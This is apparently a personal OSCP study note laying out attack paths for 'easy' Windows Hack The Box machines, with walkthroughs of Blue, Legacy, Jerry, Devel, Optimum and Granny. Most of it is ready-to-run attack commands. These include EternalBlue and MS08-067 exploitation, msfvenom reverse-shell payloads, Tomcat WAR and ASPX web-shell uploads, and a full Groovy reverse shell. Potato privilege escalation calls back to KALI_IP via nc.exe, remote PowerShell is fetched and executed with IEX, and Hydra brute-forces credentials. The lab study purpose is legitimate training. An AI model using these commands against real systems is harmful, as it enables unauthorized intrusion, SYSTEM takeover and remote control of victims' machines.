---
tags: [oscp-journey, spectre, stage-4, htb, windows, easy-machines]
module: 4
cert-stage: oscp
difficulty: beginner
date: 2026-04-08
phantom-refs: []
netgod-refs: []
---

# S4-03 — Windows Easy Machine Deep Methodology

## What Makes a Windows Easy Machine

HTB Easy Windows machines share these characteristics:
- Known CVE exploiting an unpatched service (EternalBlue, BlueKeep, old IIS)
- Misconfigured service (Tomcat with default creds, writable FTP → IIS)
- SeImpersonatePrivilege from a service account (most common modern path)
- Root/SYSTEM in 30–60 minutes

**Key difference from Linux Easy:** Windows Easy machines more frequently give you SYSTEM directly on foothold (EternalBlue, Tomcat WAR as SYSTEM) rather than requiring a separate PrivEsc step. When PrivEsc is needed, SeImpersonatePrivilege is the most common vector.

---

## Most Common Foothold Paths on Easy Windows

### Path 1 — EternalBlue MS17-010 (Windows 7 / Server 2008)

**Conditions:** Port 445 open, Windows 7 or Server 2008 R2

**Detection:**
```bash
nmap --script smb-vuln-ms17-010 -p445 TARGET
# Output: VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1
nmap -sV -p445 TARGET
# smbd version will show Windows 7 or Server 2008
```

**Manual exploitation (no Metasploit — preserves your 1 use):**
```bash
# Clone the manual exploit:
git clone https://github.com/worawit/MS17-010
cd MS17-010

# Install dependency:
pip install impacket

# Check vulnerability:
python checker.py TARGET

# Generate shellcode:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -f raw -o shellcode.bin

# Alternative for 32-bit targets:
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -f raw -o shellcode32.bin

# Start listener:
nc -lvnp 4444

# Exploit:
python zzz_exploit.py TARGET            # For Windows 7/2008
python eternalblue_exploit7.py TARGET shellcode.bin
```

**Metasploit version (costs your 1 use — save unless stuck):**
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set LHOST tun0
set LPORT 4444
run
# → SYSTEM shell
```

**What EternalBlue does:** Exploits a buffer overflow in the SMBv1 server implementation (srv.sys). The overflow allows writing shellcode to non-paged pool memory and executing it in kernel context — resulting in immediate SYSTEM.

---

### Path 2 — Tomcat Manager Default Credentials → WAR Deploy

**Conditions:** Port 8080 open with Tomcat, manager application accessible

**Detection:**
```bash
nmap -sV -p8080 TARGET
# output: Apache Tomcat 9.0.1

# Browse to:
curl http://TARGET:8080/manager/html    # Prompts for auth
curl http://TARGET:8080/manager/status
```

**Exploitation:**
```bash
# Try default credentials:
# admin:admin, tomcat:tomcat, admin:s3cret, tomcat:s3cret, admin:tomcat

# With Hydra:
hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt \
      -P /usr/share/seclists/Passwords/tomcat-passwords.txt \
      TARGET http-get /manager/html -s 8080

# Generate WAR payload:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -f war -o shell.war

# Start listener:
nc -lvnp 4444

# Deploy WAR via curl (with found creds):
curl -u 'tomcat:s3cret' "http://TARGET:8080/manager/text/deploy?path=/shell" \
  --upload-file shell.war

# Trigger:
curl http://TARGET:8080/shell/
# → Shell as tomcat/SYSTEM (Tomcat often runs as SYSTEM on Windows)
```

---

### Path 3 — FTP Anonymous Write → IIS Webroot → ASPX Shell

**Conditions:** FTP port 21 open, IIS port 80 open, FTP writable to webroot

**Detection:**
```bash
nmap --script ftp-anon -p21 TARGET
# [+] ftp-anon: Anonymous FTP login allowed
ftp TARGET
# anonymous login → ls → check if /inetpub/wwwroot or similar is accessible
```

**Exploitation:**
```bash
# Generate ASPX shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -f aspx -o shell.aspx

# Upload via FTP:
ftp TARGET
# User: anonymous
# Pass: anonymous
put shell.aspx    # Upload to FTP root

# Start listener:
nc -lvnp 4444

# Trigger via IIS:
curl http://TARGET/shell.aspx
# → Shell as IIS AppPool user (has SeImpersonatePrivilege)
```

---

### Path 4 — IIS WebDAV → ASPX Shell

**Conditions:** IIS with WebDAV enabled, PUT method allowed

**Detection:**
```bash
nmap --script http-methods -p80 TARGET
# Output: PUT, DELETE, MOVE (WebDAV methods)

davtest -url http://TARGET/    # Test what file types can be uploaded
```

**Exploitation:**
```bash
# Test with davtest:
davtest -url http://TARGET/
# Look for: SUCCEED: PUT aspx

# Upload shell directly:
curl -X PUT http://TARGET/shell.aspx -d @shell.aspx

# If PUT is blocked for .aspx but .txt works:
curl -X PUT http://TARGET/shell.txt -d @shell.aspx
# Move to .aspx:
curl -X MOVE --header "Destination:http://TARGET/shell.aspx" http://TARGET/shell.txt

# Trigger:
curl http://TARGET/shell.aspx
```

**cadaver (WebDAV client):**
```bash
cadaver http://TARGET/
# Inside cadaver:
put shell.aspx
# → Uploads the shell
```

---

### Path 5 — SMB MS08-067 (Windows XP / Server 2003)

**Conditions:** Very old Windows (XP/2003), port 445 open

```bash
nmap --script smb-vuln-ms08-067 -p445 TARGET

# Manual exploit:
searchsploit ms08-067
searchsploit -m exploits/windows/remote/40279.py

# Modify shellcode in script for your IP/port, then:
python 40279.py TARGET 1    # Option 1 = Windows XP SP3 English
# → SYSTEM shell
```

---

### Path 6 — Jenkins Groovy Script Console

**Conditions:** Jenkins running on 8080, accessible without auth or with default creds

```bash
# Browse: http://TARGET:8080
# Check for: Manage Jenkins → Script Console (unauthenticated or default creds: admin:admin)

# Groovy reverse shell:
String host="KALI_IP";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}

# nc -lvnp 4444 → shell as jenkins service account
```

---

### Path 7 — ColdFusion / JBoss / GlassFish → File Upload RCE

**Conditions:** Non-standard Java application server

```bash
# ColdFusion:
searchsploit coldfusion
# LFI: http://TARGET/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
# File upload to get CFML shell

# JBoss:
searchsploit jboss
# Unauthenticated JMXInvokerServlet exploit

# GlassFish:
# Default admin: admin:adminadmin on port 4848
# Deploy war file via admin console
```

---

## Most Common PrivEsc Paths on Easy Windows

### PrivEsc 1 — SeImpersonatePrivilege → PrintSpoofer/GodPotato

**The most common Windows Easy PrivEsc.** Run `whoami /priv` immediately after getting a shell.

```cmd
whoami /priv
# Look for:
# SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

**PrintSpoofer (Windows 10 and Server 2019):**
```cmd
# Upload PrintSpoofer64.exe to target:
certutil -urlcache -split -f http://KALI_IP/PrintSpoofer64.exe C:\Temp\ps.exe

# Execute — interactive SYSTEM shell:
C:\Temp\ps.exe -i -c cmd
# → cmd.exe running as NT AUTHORITY\SYSTEM

# Or trigger reverse shell directly:
C:\Temp\ps.exe -c "C:\Temp\nc.exe KALI_IP 5555 -e cmd.exe"
```

**GodPotato (universal — works on all Windows 2012–2022):**
```cmd
certutil -urlcache -split -f http://KALI_IP/GodPotato-NET4.exe C:\Temp\gp.exe
C:\Temp\gp.exe -cmd "whoami"
C:\Temp\gp.exe -cmd "cmd /c C:\Temp\nc.exe KALI_IP 5555 -e cmd.exe"
```

**JuicyPotato (Windows Server 2016 and older):**
```cmd
# Needs a valid CLSID for the target OS:
# Download CLSID list: github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016
certutil -urlcache -split -f http://KALI_IP/JuicyPotato.exe C:\Temp\jp.exe
C:\Temp\jp.exe -l 9001 -p C:\Temp\nc.exe -a "KALI_IP 5555 -e cmd" -t * -c {CLSID}
```

---

### PrivEsc 2 — AlwaysInstallElevated → MSI Payload

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must show 0x1
```

```bash
# On Kali — generate MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o evil.msi

# Transfer and install on target:
certutil -urlcache -split -f http://KALI_IP/evil.msi C:\Temp\evil.msi
nc -lvnp 4444    # Start listener
msiexec /quiet /qn /i C:\Temp\evil.msi
# → SYSTEM shell
```

---

### PrivEsc 3 — Unquoted Service Path

```cmd
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"
# Look for paths with spaces and no quotes

# Confirm the service runs as SYSTEM:
sc qc ServiceName
# SERVICE_START_NAME: LocalSystem ← exploitable

# Find writable gap in path:
icacls "C:\Program Files"
# If writable: create C:\Program.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o Program.exe
# Transfer to C:\Program.exe, restart service, catch shell as SYSTEM
```

---

## Classic HTB Easy Windows Machine Walkthroughs

### Blue (HTB) — EternalBlue on Windows 7

```bash
# Nmap: Windows 7 x64, port 445, SMBv1
nmap --script smb-vuln-ms17-010 -p445 10.10.10.40
# VULNERABLE

# Manual exploit:
git clone https://github.com/worawit/MS17-010 && cd MS17-010
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f raw -o shellcode.bin
nc -lvnp 4444 &
python zzz_exploit.py 10.10.10.40
# → NT AUTHORITY\SYSTEM immediately

# Proof:
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

**What this teaches:** EternalBlue gives SYSTEM directly — no PrivEsc phase. On Windows 7 with SMBv1 enabled, this is the full attack chain.

---

### Legacy (HTB) — MS08-067 on Windows XP

```bash
# Nmap: Windows XP SP3, port 445
nmap --script smb-vuln-ms08-067 -p445 10.10.10.4
# VULNERABLE

searchsploit ms08-067
searchsploit -m exploits/windows/remote/40279.py

# Modify exploit: change shellcode section for your LHOST/LPORT
# Generate shellcode:
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" \
  -f py -v shellcode

# Replace shellcode in exploit, start listener:
nc -lvnp 4444 &
python 40279.py 10.10.10.4 1    # OS option 1 = XP SP3 English
# → SYSTEM
```

---

### Jerry (HTB) — Tomcat Default Credentials

```bash
# Nmap: Apache Tomcat 9.0.1 on port 8080

# Try manager credentials:
# admin:admin, tomcat:tomcat → denied
# admin:s3cret → ACCESS GRANTED to /manager/html

# Generate WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f war -o shell.war

# Deploy via curl:
curl -u admin:s3cret http://10.10.10.95:8080/manager/text/deploy?path=/shell --upload-file shell.war

# Listener:
nc -lvnp 4444

# Trigger:
curl http://10.10.10.95:8080/shell/
# → NT AUTHORITY\SYSTEM (Tomcat runs as SYSTEM on this box)

# Both flags in same directory:
type C:\Users\Administrator\Desktop\flags\user.txt
type C:\Users\Administrator\Desktop\flags\root.txt
```

---

### Devel (HTB) — FTP Write to IIS → SeImpersonate → SYSTEM

```bash
# Nmap: FTP 21, IIS 7.5 on port 80

# FTP anonymous login:
ftp 10.10.10.5    # anonymous:anonymous
ls                 # IIS webroot is accessible via FTP!

# Generate ASPX shell:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f aspx -o shell.aspx
# Or stageless for nc:
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f aspx -o shell.aspx

# Upload via FTP:
ftp 10.10.10.5
put shell.aspx

# Start listener:
nc -lvnp 4444

# Trigger:
curl http://10.10.10.5/shell.aspx
# → shell as iis apppool\web (low priv)

# Check privileges:
whoami /priv
# SeImpersonatePrivilege: Enabled

# Download and run PrintSpoofer or JuicyPotato:
certutil -urlcache -split -f http://KALI_IP/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
certutil -urlcache -split -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe
nc -lvnp 5555 &
C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe KALI_IP 5555 -e cmd"
# → NT AUTHORITY\SYSTEM
```

---

### Optimum (HTB) — HttpFileServer RCE → Kernel Exploit

```bash
# Nmap: HttpFileServer httpd 2.3 on port 80

# Searchsploit:
searchsploit httpfileserver 2.3
# → exploits/windows/remote/39161.py (CVE-2014-6287)

searchsploit -m exploits/windows/remote/39161.py
# Modify: LHOST and LPORT in script

# The exploit runs VBScript via HFS macro execution:
python 39161.py 10.10.10.8 80
# → shell as kostas (user)

# PrivEsc - Windows Server 2012 R2:
systeminfo
# OS: Windows Server 2012 R2 → check for MS16-032

powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/MS16-032.ps1')"
# → SYSTEM via secondary logon handle escalation
```

---

### Granny (HTB) — WebDAV PUT + MOVE → ASPX → Churrasco → SYSTEM

```bash
# Nmap: IIS 6.0, WebDAV enabled
davtest -url http://10.10.10.15/
# SUCCEED: PUT txt, html → but NOT aspx directly

# IIS 6 won't execute .aspx PUT directly — use MOVE:
curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx
curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt

# Trigger:
curl http://10.10.10.15/shell.aspx
# → shell as NT AUTHORITY\NETWORK SERVICE (not SYSTEM)

# PrivEsc:
whoami /priv
# SeImpersonatePrivilege: Enabled (old Windows — use Churrasco)
# Churrasco is the old-school Potato for Windows 2003/XP

certutil -urlcache -split -f http://KALI_IP/Churrasco.exe C:\Temp\ch.exe
certutil -urlcache -split -f http://KALI_IP/nc.exe C:\Temp\nc.exe
nc -lvnp 5555 &
C:\Temp\ch.exe "C:\Temp\nc.exe KALI_IP 5555 -e cmd.exe"
# → SYSTEM
```

---

## The Windows Easy PrivEsc Decision Tree

```
Got shell on Windows?

1. whoami /priv → SeImpersonatePrivilege Enabled?
   YES → PrintSpoofer (Server 2019/Win10) or GodPotato (universal)
         → SYSTEM in 30 seconds

2. systeminfo | findstr "OS Version" → Windows 7/Server 2008?
   YES → Check EternalBlue not already exploited for foothold
         → If not: MS17-010 on any other open SMB service
   
3. reg query both AlwaysInstallElevated keys → both 0x1?
   YES → msfvenom MSI → msiexec → SYSTEM

4. wmic service get name,pathname → unquoted paths with spaces?
   YES → icacls on writable gap → place payload → restart → SYSTEM

5. cmdkey /list → saved credentials?
   YES → runas /savecred /user:MACHINE\Administrator cmd

6. Run WinPEAS and read every red finding

7. systeminfo + wmic qfe → old OS with missing patches?
   YES → searchsploit [OS version] local privilege
   → MS16-032, MS15-051, etc.
```

---

## Key Tool Transfer Methods — Windows

Always have these ready before exploiting:

```bash
# Serve files from Kali:
python3 -m http.server 80
impacket-smbserver share . -smb2support    # For net use

# Transfer to Windows target:
# Method 1 — certutil (almost always available):
certutil -urlcache -split -f http://KALI_IP/tool.exe C:\Temp\tool.exe

# Method 2 — PowerShell:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/tool.exe','C:\Temp\tool.exe')"
powershell -c "Invoke-WebRequest -Uri 'http://KALI_IP/tool.exe' -OutFile 'C:\Temp\tool.exe'"

# Method 3 — SMB share:
net use \\KALI_IP\share
copy \\KALI_IP\share\tool.exe C:\Temp\

# Method 4 — bitsadmin:
bitsadmin /transfer myJob http://KALI_IP/tool.exe C:\Temp\tool.exe
```

---

## Quick Reference — Easy Windows Checklist

```bash
# FOOTHOLD CHECK LIST:
nmap -sC -sV -T4 -Pn -oA quick TARGET
nmap -p- -T4 --min-rate 5000 -Pn -oA full TARGET &
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p445 TARGET
nmap --script http-methods -p80,8080 TARGET

# POST-FOOTHOLD (first 30 seconds):
whoami /all
whoami /priv    # SeImpersonatePrivilege? → STOP → PrintSpoofer/GodPotato now
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
cmdkey /list

# TOOL UPLOAD:
certutil -urlcache -split -f http://KALI_IP/winPEASx64.exe C:\Temp\wp.exe
certutil -urlcache -split -f http://KALI_IP/PrintSpoofer64.exe C:\Temp\ps.exe
certutil -urlcache -split -f http://KALI_IP/GodPotato-NET4.exe C:\Temp\gp.exe
certutil -urlcache -split -f http://KALI_IP/nc.exe C:\Temp\nc.exe

# PROOF:
hostname && whoami && type C:\Users\Administrator\Desktop\root.txt
```

---

## Common Mistakes on Easy Windows Machines

> [!warning] Easy Windows mistakes
> 1. **Using Meterpreter when a simple shell works.** On OSCP, you only get 1 Metasploit exploit module. If you use it on Blue (EternalBlue), you can't use it again. Use manual exploits — the manual Python EternalBlue exploit gives SYSTEM just as well.
> 2. **Not checking SeImpersonatePrivilege immediately.** It's the first thing to check. Many candidates spend 20 minutes on WinPEAS when `whoami /priv` would have shown SeImpersonate immediately.
> 3. **Using JuicyPotato on Server 2019 (it doesn't work).** JuicyPotato requires DCOM objects that were patched on Server 2019. Use PrintSpoofer or GodPotato instead.
> 4. **Not serving nc.exe from Kali.** The Potato tools need to run something as SYSTEM. Usually that's nc.exe calling back. Always have nc.exe ready to serve on your HTTP server.
> 5. **Triggering ASPX shell without a listener running.** The shell executes, finds no listener, and the connection is lost. Always `nc -lvnp PORT` before triggering any reverse shell.
> 6. **Forgetting to create C:\Temp.** Many payloads try to write to `C:\Temp` which doesn't exist by default. Create it first: `mkdir C:\Temp`.

---

## Practice Resources

| Machine | Key Technique | Difficulty |
|---------|--------------|-----------|
| HTB — Blue | EternalBlue MS17-010 | ⭐ Start here |
| HTB — Legacy | MS08-067 on Windows XP | ⭐ Start here |
| HTB — Jerry | Tomcat default creds → WAR | ⭐⭐ |
| HTB — Devel | FTP → IIS → SeImpersonate | ⭐⭐ |
| HTB — Optimum | HFS CVE → MS16-032 | ⭐⭐ |
| HTB — Granny | WebDAV MOVE → Churrasco | ⭐⭐ |
| HTB — Arctic | ColdFusion LFI → upload | ⭐⭐⭐ |
| TryHackMe — Steel Mountain | HFS + PowerUp + unquoted path | ⭐⭐ |
